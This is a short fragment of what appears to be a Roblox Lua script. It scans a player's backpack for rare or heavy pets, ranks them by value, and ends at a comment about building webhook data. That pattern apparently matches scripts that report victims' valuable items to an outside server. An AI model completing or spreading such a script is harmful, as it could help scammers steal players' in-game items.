-- Pets logic
local matchedTools = {}
local petNames = {
    ["Silver Monkey"] = true,
    ["Queen Bee"] = true,
    ["Raccoon"] = true,
    ["Dragonfly"] = true,
    ["Butterfly"] = true,
    ["Red Fox"] = true,
    ["Chicken Zombie"] = true,
    ["Disco Bee"] = true
}

for _, tool in ipairs(Backpack:GetChildren()) do
    if tool:IsA("Tool") then
        local name = tool.Name
        local petType = name:match("^(.-) %[") or ""
        local rawKg = name:match("%[(.-) KG%]") or ""
        local kg = tonumber((rawKg:gsub(",", "."):gsub("[^%d%.]", "")))
        local rawAge = name:match("Age (%d+)") or ""
        local age = tonumber((rawAge:gsub("[^%d]", "")))

        if petType and (petNames[petType] or (kg and kg > 20) or (age and age > 50)) then
            local value = (kg or 0) * 2 + (age or 0)
            table.insert(matchedTools, {tool = tool, value = value, name = name})
        end
    end
end

-- Sort by value descending
table.sort(matchedTools, function(a, b)
    return a.value > b.value
end)

-- Build webhook data
